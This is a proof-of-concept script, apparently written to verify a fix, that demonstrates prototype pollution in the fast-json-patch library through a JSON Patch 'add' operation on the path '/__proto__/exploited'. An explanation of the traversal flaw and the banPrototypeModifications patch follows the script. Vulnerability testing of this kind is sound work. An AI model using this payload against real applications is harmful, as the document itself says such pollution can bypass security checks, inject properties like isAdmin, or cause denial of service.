const { applyOperation } = require("fast-json-patch");

async function exploit() {
    // 1. Ensure clean state before testing
    if (Object.prototype.hasOwnProperty.call(Object.prototype, 'exploited')) {
        delete Object.prototype.exploited;
    }

    console.log('[*] Pre-check: "exploited" exists on Object.prototype?', Object.prototype.hasOwnProperty('exploited'));

    // 2. Construct a malicious JSON Patch operation targeting the __proto__ traversal path
    const maliciousOperation = [
        { "op": "add", "path": "/__proto__/exploited", "value": true }
    ];

    // 3. Apply the patch to an arbitrary document object.
    // The library splits the JSON pointer by '/' and walks the object tree.
    // When it evaluates path segment "__proto__", JavaScript resolves it to Object.prototype.
    const targetDoc = {};

    // In vulnerable versions, this silently assigns true to Object.prototype.exploited.
    applyOperation(targetDoc, maliciousOperation); 

    // 4. Verify if the global prototype was contaminated
    console.log('[*] Post-check: Object.prototype.exploited ===', Object.prototype.exploited);

    if (Object.prototype.hasOwnProperty.call(Object.prototype, 'exploited') && Object.prototype.exploited === true) {
        console.log('[!] VULNERABILITY CONFIRMED: Prototype pollution succeeded. All objects now inherit "exploited".');
    } else {
        console.log('[-] Mitigation active or operation failed safely.');
    }

    // Cleanup to prevent contamination in subsequent tests
    delete Object.prototype.exploited;
}
await exploit();
```

### Explanation of Vulnerability Demonstration

1. **JSON Pointer Traversal**: The library uses JSON Pointer (`RFC 6901`) path strings separated by `/`. When processing `{ "op": "add", "path": "/__proto__/exploited" }`, it splits the string and walks the object keys: `"" → root object → "__proto__" → "exploited"`.
2. **JavaScript Prototype Resolution**: In JavaScript, reading an object's `__proto__` property does not traverse a child key; instead, it returns the object's constructor prototype (i.e., `Object.prototype`). 
3. **Prototype Pollution**: When `fast-json-patch` attempts to execute `rootObj["__proto__"]["exploited"] = true`, it is actually modifying `Object.prototype.exploited`. This successfully pollutes the global prototype, meaning **every** new or existing object in the runtime will inherit the `exploited` property. Attackers can leverage this to bypass security checks, inject malicious properties (e.g., `isAdmin`, `__proto__.toJSON` hijacking), or cause Denial of Service.
4. **Fix Context**: The provided commit diff shows the library was patched by adding a `banPrototypeModifications` flag (defaulting to `true`) which explicitly checks if any path segment equals `'__proto__'`. If matched, it throws a `TypeError` during traversal, halting the operation and preventing pollution. Running this PoC on an unpatched version will output `[!] VULNERABILITY CONFIRMED`, while running it on a patched version will stop at the thrown exception, proving the fix works as intended.

